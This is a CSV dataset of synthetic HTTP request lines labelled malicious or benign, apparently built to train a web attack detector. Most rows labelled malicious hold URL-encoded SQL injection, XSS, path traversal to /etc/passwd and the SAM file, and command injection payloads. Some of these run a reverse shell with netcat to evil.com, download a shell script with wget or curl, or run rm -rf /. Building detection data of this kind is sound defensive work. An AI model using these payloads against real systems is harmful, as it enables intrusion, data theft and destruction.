text,label
PATCH /profile new_password=581&session=hello+world&filter=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/orders?username=best+regards&content=please%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20request&new_password=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /products/123 content=this%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/search?token=867&id=%60id%60 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /dashboard search_term=hello+world&session=601 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /images/logo.png?author=123+Main+St&tag=595&user_id=%27%20AND%201%3D2--&limit=this+is+a+normal+comment&last_name=347 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/reports old_password=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /about comment=315&age=572&first_name=my+address+is&action=please+find+attached&session=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/products tags=379&id=671&product_id=best+regards&user_id=927 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /dashboard?title=my+address+is&category=admin+access+request&color=admin+access+request&rating=%7C%20cat%20/etc/passwd&type=354 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /posts/789?sort=88&password=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /about?username=my%20admin%27/%2A%20order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/reports?password=admin%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/v1/data status=476&order_id=please+find+attached&sort=contact%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20world&user_id=359&format=352 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /posts/789?phone=639&author=578&action=670&columns=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?status=59&limit=356&search=admin+access+request&q=test%20%7C%20curl%20http%3A//evil.com/backdoor%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /about?order=contact+me+at+email@example.com&last_name=463&username=John+Doe&price_min=my%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /about?sort=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&new_password=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/reports?new_password=contact%20%27%20AND%201%3D2--%20St&author=986&search_term=303 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /help/faq city=123%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20email%40example.com&age=please+find+attached&columns=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/search?last_name=641&content=590 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /css/style.css?last_name=my+address+is&quantity=I%20%26%20whoami%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/v1/data?product_id=857 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/products price_min=950&old_password=281&first_name=....//....//....//etc/passwd&comment=130&id=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /register product_id=875&session=please+find+attached&status=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /users/456 page=admin%27%23 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /register?quantity=433&region=I%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20entry&search_term=352 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?search=345&tag=508&email=361&old_password=228 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /api/v2/analytics?tag=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&title=686&price_min=test+user&content=system+log+entry&first_name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?last_name=John%20%26%20whoami%20St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/v1/data?tags=please%20%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /settings first_name=%27%20OR%201%3D1-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /register page=362&rating=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/products token=547&last_name=510 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /help/faq filters=786&name=575&comment=826 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /contact sort=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/search?username=605&filter=971&comment=216&page=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/orders?city=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /about?page=best%20%24%28cat%20/etc/shadow%29%20order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/orders?date=please%20%26%20whoami%20regards&status=please+find+attached&tracking=I+would+like+to+order&search_term=system+log+entry&tags=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /register?columns=John+Doe&token=hello%20%3Bcat%24%7BIFS%7D/etc/passwd%20user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/users?columns=468&quantity=test+user&age=367&password=this+is+a+normal+comment&sort=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /dashboard?tracking=966&comment=426&content=777&name=thank+you&filters=568 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /docs/api last_name=best+regards&color=hello%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20you&phone=529&email=820 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /profile tracking=335&rating=7&old_password=hello%20/var/www/../../etc/passwd%20you&sort=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /css/style.css view=479&order_id=system%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /settings type=best%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/products color=this+is+a+normal+comment&tags=276&tag=%27%20OR%201%3D1--&format=528&old_password=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?format=123+Main+St&view=please+find+attached&search_term=system+log+entry&quantity=..%25252f..%25252f..%25252fetc%25252fpasswd&action=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /dashboard date=1000&comment=832&first_name=123+Main+St&content=I%20%3Csvg/onload%3Dalert%281%29%3E%20you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /dashboard?action=test+user&email=56&age=188&date=my%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20email%40example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/users sort=contact+me+at+email@example.com&date=850&content=hello%20%3B%20rm%20-rf%20/%20email%40example.com&price_max=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/v2/analytics?tags=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /posts/789 comment=158&old_password=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css title=%27%20AND%20SLEEP%285%29--&user_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?quantity=663 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /products/123 last_name=my+address+is&date=635&view=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/search?lang=668&columns=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /images/logo.png?tags=test+user&old_password=please+find+attached&city=360&status=915&lang=694 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /js/app.js?city=thank+you&page=538&columns=727&limit=810&last_name=hello%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/users?quantity=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&age=42 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /products/123?columns=%3Bcat%24%7BIFS%7D/etc/passwd&title=contact+me+at+email@example.com&search=59&new_password=984 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /contact?tags=contact+me+at+email@example.com&order=this+is+a+normal+comment&action=admin%20%27%3B%20SELECT%20pg_sleep%285%29--%20user&tracking=123+Main+St&rating=565 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?price_min=297&city=987&price_max=647&columns=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/products?sort=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /profile?tracking=702&password=this+is+a+normal+comment&id=my%20admin%27/%2A%20entry&format=873&last_name=776 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /login token=123%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20is&product_id=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/users author=John+Doe&tracking=886&password=test+user&age=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /docs/api rating=940&color=contact%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20world&price_max=John+Doe&q=I+would+like+to+order&last_name=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics author=my+address+is&phone=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /register?phone=288&email=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/reports comment=thank+you&search_term=please+find+attached&price_max=738&username=I+would+like+to+order&category=%7Cc%27a%27t%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/search?old_password=123%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20email%40example.com&color=45&id=639 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/users sort=my+address+is&date=%27%20AND%201%3D1--&format=439&filters=thank+you&tracking=126 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /js/app.js?tag=best+regards&phone=110&new_password=best+regards&order_id=admin+access+request&q=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/v2/analytics session=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?order_id=best+regards&rating=%26%20nc%20-e%20/bin/bash%20evil.com%204444&status=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /docs/api?q=thank+you&author=693&comment=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /docs/api?page=493&password=123+Main+St&status=423 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /js/app.js?token=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&rating=71&age=402 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api view=940&password=I+would+like+to+order&date=contact+me+at+email@example.com&type=803&search_term=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /docs/api?old_password=my+address+is&search_term=123+Main+St&price_max=508 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /posts/789?user_id=my+address+is&filter=901&color=admin+access+request&action=please+find+attached&quantity=John%20file%3A///etc/passwd%20St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /docs/api?order_id=864&filters=378&order=system+log+entry&email=best+regards&lang=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?author=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?q=788&tag=632&age=best+regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /contact first_name=694&search_term=45&format=contact+me+at+email@example.com&quantity=69&password=best%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/reports order_id=672&email=738&price_max=768 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/orders?title=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&new_password=547&filters=14 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /settings phone=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&price_max=best+regards&price_min=605&comment=95 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /products/123 user_id=419&tags=this+is+a+normal+comment&search=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /dashboard?user_id=John+Doe&view=620&search=448&sort=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /profile?action=193&title=890&q=965&tracking=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /posts/789?region=this+is+a+normal+comment&city=416&user_id=system+log+entry&view=%27%20AND%20%27x%27%3D%27y User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /contact tags=838&content=643&order=admin%27/%2A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /users/456?search_term=system%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /login?id=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /docs/api sort=please+find+attached&date=741 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/v1/data?author=admin+access+request&title=contact%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?author=this+is+a+normal+comment&price_min=my%20admin%27%20OR%20%271%27%3D%271%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login date=701&q=please+find+attached&quantity=John%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&id=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /login username=John+Doe&email=185&lang=John+Doe&limit=my+address+is&password=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?token=429&tag=I+would+like+to+order&date=system%20%3Csvg%20onload%3Dalert%281%29%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /settings sort=thank+you&new_password=my+address+is&quantity=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /dashboard?user_id=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?q=this+is+a+normal+comment&password=file%3A///etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard price_max=733&order_id=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--&q=42 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users new_password=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&product_id=821&region=6 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?filter=contact+me+at+email@example.com&format=admin%27/%2A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?user_id=793&username=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&region=test+user&order_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/products new_password=this+is+a+normal+comment&filters=766&format=374 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?tags=789&token=please+find+attached&sort=best%20%3B%20ls%20-la%20Doe&limit=I+would+like+to+order&price_min=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v2/analytics password=best%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /register?sort=thank+you&limit=707&category=thank%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20world&product_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /help/faq?filter=test+user&new_password=John+Doe&order_id=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /products/123?new_password=thank+you&user_id=please%20/var/www/../../etc/passwd%20order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /dashboard?author=please+find+attached&product_id=624&user_id=please+find+attached&q=admin%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20St&color=876 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /profile?first_name=589&username=84&limit=278&color=thank+you&action=123%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /docs/api title=123+Main+St&filter=my+address+is&search=thank+you&tracking=%3B%20wget%20http%3A//evil.com/shell.sh&action=833 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/v1/data?price_min=%3B%20wget%20http%3A//evil.com/shell.sh&username=John+Doe&name=846 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /posts/789 price_max=thank+you&price_min=686&tracking=thank%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20order&filters=742 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /css/style.css?phone=575&comment=878&color=123+Main+St&region=674&filter=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v2/analytics?token=468&tags=this+is+a+normal+comment&region=828&name=980&author=best%20%27%20OR%20%271%27%3D%271%27--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?comment=John+Doe&title=422&order_id=admin+access+request&color=my+address+is&phone=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /profile?email=345&columns=895&page=best+regards&action=contact%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/orders?status=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--&search=my+address+is&tracking=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /contact?rating=683 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/reports filters=492&last_name=236&email=123%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /about region=925&name=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&city=123+Main+St&limit=252&old_password=219 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings filter=test+user&price_max=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&content=697 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /login price_max=please+find+attached&new_password=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /contact name=my+address+is&action=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&format=please+find+attached&last_name=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /profile region=101 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v1/data?new_password=123+Main+St&quantity=939&email=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v1/data action=123+Main+St&phone=my+address+is&content=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--&order=813 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /settings?filters=best+regards&order_id=please+find+attached&tracking=I%20%27%20AND%20%27x%27%3D%27x%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /register?first_name=737&action=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v1/data session=thank%20%24%28cat%20/etc/shadow%29%20order&author=this+is+a+normal+comment&tracking=299&first_name=165&content=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/v1/data?comment=test+user&view=252&filters=967&user_id=563 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/search?search=307&action=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /login?sort=965&limit=832&tag=202&tracking=669&action=%60id%60 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /help/faq?comment=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /dashboard color=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /css/style.css page=John%20%7Cc%27a%27t%20/etc/passwd%20attached&first_name=contact+me+at+email@example.com&rating=admin+access+request&status=826 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
